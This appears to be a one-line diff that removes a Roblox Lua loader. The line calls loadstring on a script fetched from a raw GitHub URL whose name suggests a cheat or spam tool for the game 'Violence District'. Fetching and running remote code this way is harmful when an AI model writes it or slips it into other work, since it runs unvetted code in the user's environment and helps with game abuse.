@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/butcher-x-violence-district-spam0-obksj7mpn50w34.lua"))()
